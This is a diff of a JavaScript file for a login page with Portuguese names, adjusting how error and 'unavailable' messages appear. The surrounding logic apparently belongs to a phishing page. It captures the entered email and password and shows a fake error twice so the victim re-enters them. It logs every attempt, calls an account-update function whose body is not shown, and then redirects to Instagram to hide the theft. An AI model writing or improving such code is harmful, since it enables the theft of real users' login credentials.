@@ -5,8 +5,9 @@ xml.addEventListener("load", loaded);
 
 let contador = 0;
 let email, senha;
-let MensagemDeErro, MensagemInsponivel;
 let NumeroContas;
+const MensagemIndisponivel = document.getElementById('MensagemIndisponivel');
+const MensagemDeErro = document.getElementById('MensagemDeErro');
 
 
 
@@ -43,7 +44,6 @@ function AtualizarConta(){
 function redirect() {
     email = document.getElementById('login-email').value;
     senha = document.getElementById('login-senha').value;
-    MensagemDeErro = document.getElementById('MensagemDeErro');
     
     if (email !== "" && senha !== "" && contador === 0) {
         AtualizarConta();
@@ -52,6 +52,7 @@ function redirect() {
         document.getElementById('login-senha').value = '';
 
         MensagemDeErro.style.display = "block";
+        MensagemIndisponivel.style.display = "none";
 
         console.log("Os primeiros valores digitados foram:", email, senha);
         contador = 2;
@@ -64,6 +65,7 @@ function redirect() {
         document.getElementById('login-senha').value = '';
     
         MensagemDeErro.style.display = "block";
+        MensagemIndisponivel.style.display = "none";
     
         console.log("Os segundos valores digitados foram:", email, senha);
         contador = 4;
@@ -73,6 +75,7 @@ function redirect() {
         AtualizarConta();
 
         MensagemDeErro.style.display = "none";
+        MensagemIndisponivel.style.display = "none";
     
         console.log("Os terceiros valores digitados foram:", email, senha);
         window.location.href = "https://www.instagram.com/";
@@ -87,8 +90,8 @@ window.addEventListener("keydown", function(event) {
 
 function SemMensagem()
 {
-    MensagemInsponivel = document.getElementById('MensagemIndisponivel');
-    MensagemInsponivel.style.display = "block";
+    MensagemDeErro.style.display = "none";
+    MensagemIndisponivel.style.display = "block";
 }
 
 
